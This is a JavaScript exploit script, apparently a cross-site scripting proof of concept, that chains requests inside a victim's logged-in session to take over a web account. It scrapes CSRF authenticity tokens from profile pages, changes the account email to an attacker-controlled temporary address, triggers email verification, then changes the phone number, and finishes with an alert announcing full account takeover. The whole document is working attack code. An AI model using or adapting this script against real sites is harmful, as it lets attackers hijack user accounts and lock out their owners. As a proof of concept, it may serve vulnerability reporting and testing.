(async function() {
    const targetEmail = "mo47re3ilj5s@tempmail.ing";
    const targetPhone = "(443) 329-8461"; 
    const parser = new DOMParser();

    try {
        // --- STEP 1: Fetch CSRF Token for Email Update ---
        console.log("[*] Fetching CSRF Token for email update...");
        const res1 = await fetch('/my_profile/email');
        const html1 = await res1.text();
        const doc1 = parser.parseFromString(html1, 'text/html');
        const token1 = doc1.querySelector('input[name="authenticity_token"]').value;

        if (!token1) throw new Error("Failed to retrieve the first Authenticity Token.");

        // --- STEP 2: Execute Email Update (PATCH) ---
        console.log("[*] Executing email update request...");
        const updateParams = new URLSearchParams();
        updateParams.append('_method', 'patch');
        updateParams.append('authenticity_token', token1);
        updateParams.append('user[email]', targetEmail);
        updateParams.append('commit', 'Save');

        await fetch('/user', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Csrf-Token': token1,
                'Accept': 'text/vnd.turbo-stream.html, text/html'
            },
            body: updateParams.toString()
        });

        // --- STEP 3: Fetch Token for Email Verification ---
        console.log("[*] Fetching token for email verification...");
        const res2 = await fetch('/my_profile/email');
        const html2 = await res2.text();
        const doc2 = parser.parseFromString(html2, 'text/html');
        const token2 = doc2.querySelector('input[name="authenticity_token"]').value;

        if (!token2) throw new Error("Failed to retrieve the verification Token.");

        // --- STEP 4: Trigger Verification Email ---
        console.log("[*] Triggering verification email...");
        const verifyParams = new URLSearchParams();
        verifyParams.append('authenticity_token', token2);

        const resVerify = await fetch('/email_verification', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Csrf-Token': token2,
                'Accept': 'text/vnd.turbo-stream.html, text/html'
            },
            body: verifyParams.toString()
        });

        if (resVerify.ok) {
            console.log("[+] Email modification stage completed successfully.");

            // --- INTERACTION: Confirm before proceeding to Phone Modification ---
            // This demonstrates the attacker's control over the flow.
            if (confirm("Stage 1 Complete: Email update request sent. Is the control-panel email ready for takeover? Click 'OK' to proceed with Phase 2: Phone Number Modification.")) {
                
                // --- STEP 5: Fetch Token for Phone Number Update ---
                console.log("[*] Fetching CSRF Token for phone number update...");
                const res3 = await fetch('/my_profile/phone');
                const html3 = await res3.text();
                const doc3 = parser.parseFromString(html3, 'text/html');
                const token3 = doc3.querySelector('input[name="authenticity_token"]').value;

                if (!token3) throw new Error("Failed to retrieve the Phone Number Token.");

                // --- STEP 6: Execute Phone Number Update ---
                console.log("[*] Executing phone number update and sending verification link...");
                const phoneParams = new URLSearchParams();
                phoneParams.append('authenticity_token', token3);
                phoneParams.append('phone_update[phone]', targetPhone);
                phoneParams.append('commit', 'Send Verification Link By Email');

                const resPhone = await fetch('/phone_update', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Csrf-Token': token3,
                        'Accept': 'text/vnd.turbo-stream.html, text/html'
                    },
                    body: phoneParams.toString()
                });

                if (resPhone.ok) {
                    alert("Full Account Takeover Process Executed!\n\nBoth Email and Phone Number update requests have been successfully sent to the server in the victim's session.");
                }
            }
        }

    } catch (err) {
        console.error("[!] Exploit Chain Interrupted: ", err);
    }
})();
